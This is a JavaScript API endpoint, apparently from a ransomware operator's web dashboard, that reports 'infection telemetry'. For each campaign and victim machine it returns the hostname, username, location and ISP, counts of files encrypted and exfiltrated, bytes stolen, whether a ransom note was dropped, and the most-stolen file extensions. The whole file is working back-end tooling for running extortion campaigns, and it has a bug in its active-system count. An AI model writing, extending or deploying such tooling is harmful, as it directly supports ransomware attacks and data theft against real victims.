// vercel-dashboard/api/stats/index.js
// Dashboard stats endpoint - aggregates infection telemetry (FIXED: uses correct KV keys)

import { kv } from '../../lib/kv.js';

export default async function handler(request, response) {
  if (request.method === 'OPTIONS') {
    return response.status(200).end();
  }

  if (request.method !== 'GET') {
    return response.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { systemId, campaignId, range = '7d' } = request.query;

    if (systemId) {
      return await getSystemStats(response, systemId);
    } else if (campaignId) {
      return await getCampaignStats(response, campaignId, range);
    } else {
      return await getGlobalStats(response, range);
    }
  } catch (error) {
    console.error('Stats error:', error);
    response.status(500).json({ error: 'Internal server error' });
  }
}

async function getSystemStats(response, systemId) {
  const system = await kv.get(`system:${systemId}`);
  if (!system) return response.status(404).json({ error: 'System not found' });

  const stats = await kv.hgetall(`system:${systemId}:stats`) || {};
  const fileIds = await kv.smembers(`system:${systemId}:files`) || [];
  
  const recentFiles = [];
  for (const fid of fileIds.slice(-20)) {
    const meta = await kv.get(`file:${fid}:meta`);
    if (meta) recentFiles.push(meta);
  }

  response.json({
    systemId,
    hostname: system.hostname,
    username: system.username,
    os: system.os,
    country: system.country,
    city: system.city,
    isp: system.isp,
    status: system.status,
    firstSeen: system.firstSeen,
    lastSeen: system.lastSeen,
    stats: {
      filesEncrypted: parseInt(stats.filesEncrypted || '0'),
      filesExfiltrated: parseInt(stats.filesExfiltrated || '0'),
      bytesExfiltrated: parseInt(stats.bytesExfiltrated || '0'),
      ransomNoteDropped: stats.ransomNoteDropped === 'true'
    },
    recentFiles: recentFiles.reverse()
  });
}

async function getCampaignStats(response, campaignId, range) {
  const campaign = await kv.get(`campaign:${campaignId}`);
  if (!campaign) return response.status(404).json({ error: 'Campaign not found' });

  const days = range === '1d' ? 1 : range === '7d' ? 7 : range === '30d' ? 30 : 7;
  const dates = [];
  for (let i = days - 1; i >= 0; i--) {
    const d = new Date();
    d.setDate(d.getDate() - i);
    dates.push(d.toISOString().split('T')[0]);
  }

  const dailyStats = [];
  let totalUploads = 0;
  let totalBytes = 0;

  for (const date of dates) {
    const dayStats = await kv.hgetall(`campaign:${campaignId}:daily:${date}`);
    const uploads = parseInt(dayStats?.uploads || '0');
    const bytes = parseInt(dayStats?.bytes || '0');
    dailyStats.push({ date, uploads, bytes });
    totalUploads += uploads;
    totalBytes += bytes;
  }

  const stats = await kv.hgetall(`campaign:${campaignId}:stats`) || {};
  const systemIds = await kv.smembers(`campaign:${campaignId}:systems`) || [];
  
  // Get recent infections (systems)
  const recentSystems = [];
  const sortedSystems = [];
  for (const sid of systemIds) {
    const sys = await kv.get(`system:${sid}`);
    if (sys) sortedSystems.push(sys);
  }
  sortedSystems.sort((a, b) => new Date(b.firstSeen) - new Date(a.firstSeen));
  
  for (const sys of sortedSystems.slice(0, 10)) {
    const s = await kv.hgetall(`system:${sys.id}:stats`) || {};
    recentSystems.push({
      id: sys.id,
      hostname: sys.hostname,
      country: sys.country,
      city: sys.city,
      status: sys.status,
      firstSeen: sys.firstSeen,
      filesEncrypted: parseInt(s.filesEncrypted || '0'),
      filesExfiltrated: parseInt(s.filesExfiltrated || '0'),
      bytesExfiltrated: parseInt(s.bytesExfiltrated || '0')
    });
  }

  // Top extensions for this campaign
  const exts = await kv.hgetall(`campaign:${campaignId}:exts`) || {};
  const topExtensions = Object.entries(exts)
    .sort((a, b) => b[1] - a[1])
    .slice(0, 15)
    .map(([ext, count]) => ({ ext, count: parseInt(count) }));

  response.json({
    campaignId,
    campaignName: campaign.name,
    range,
    summary: {
      totalInfections: parseInt(stats.totalInfections || '0'),
      totalFiles: parseInt(stats.totalFiles || '0'),
      totalBytes: parseInt(stats.totalBytes || '0'),
      avgFilesPerInfection: systemIds.length > 0 ? (totalUploads / systemIds.length).toFixed(1) : 0,
      activeSystems: systemIds.filter(async (sid) => {
        const s = await kv.get(`system:${sid}`);
        return s?.status === 'active';
      }).length
    },
    daily: dailyStats,
    topExtensions,
    recentInfections: recentSystems
  });
}

async function getGlobalStats(response, range) {
  const days = range === '1d' ? 1 : range === '7d' ? 7 : range === '30d' ? 30 : 7;
  const dates = [];
  for (let i = days - 1; i >= 0; i--) {
    const d = new Date();
    d.setDate(d.getDate() - i);
    dates.push(d.toISOString().split('T')[0]);
  }

  const dailyStats = [];
  let totalUploads = 0;
  let totalBytes = 0;

  for (const date of dates) {
    const dayStats = await kv.hgetall(`global:daily:${date}`);
    const uploads = parseInt(dayStats?.uploads || '0');
    const bytes = parseInt(dayStats?.bytes || '0');
    dailyStats.push({ date, uploads, bytes });
    totalUploads += uploads;
    totalBytes += bytes;
  }

  const globalStats = await kv.hgetall('global:stats') || {};
  const campaignIds = await kv.smembers('global:campaigns') || [];
  const systemIds = await kv.smembers('global:systems') || [];
  const fileIds = await kv.smembers('global:files') || [];

  // Top extensions globally
  const globalExts = await kv.hgetall('global:exts') || {};
  const topExtensions = Object.entries(globalExts)
    .sort((a, b) => b[1] - a[1])
    .slice(0, 20)
    .map(([ext, count]) => ({ ext, count: parseInt(count) }));

  // Recent systems globally
  const recentSystems = [];
  const sortedSystems = [];
  for (const sid of systemIds.slice(0, 100)) { // Sample for performance
    const sys = await kv.get(`system:${sid}`);
    if (sys) sortedSystems.push(sys);
  }
  sortedSystems.sort((a, b) => new Date(b.firstSeen) - new Date(a.firstSeen));
  
  for (const sys of sortedSystems.slice(0, 10)) {
    const s = await kv.hgetall(`system:${sys.id}:stats`) || {};
    const camp = await kv.get(`campaign:${sys.campaignId}`);
    recentSystems.push({
      id: sys.id,
      campaignName: camp?.name || 'Unknown',
      hostname: sys.hostname,
      country: sys.country,
      city: sys.city,
      status: sys.status,
      firstSeen: sys.firstSeen,
      filesEncrypted: parseInt(s.filesEncrypted || '0'),
      filesExfiltrated: parseInt(s.filesExfiltrated || '0'),
      bytesExfiltrated: parseInt(s.bytesExfiltrated || '0')
    });
  }

  response.json({
    range,
    summary: {
      totalCampaigns: campaignIds.length,
      totalInfections: systemIds.length,
      totalFiles: fileIds.length,
      totalBytes: parseInt(globalStats.totalBytes || '0'),
      avgFilesPerInfection: systemIds.length > 0 ? (fileIds.length / systemIds.length).toFixed(1) : 0
    },
    daily: dailyStats,
    topExtensions,
    recentInfections: recentSystems
  });
}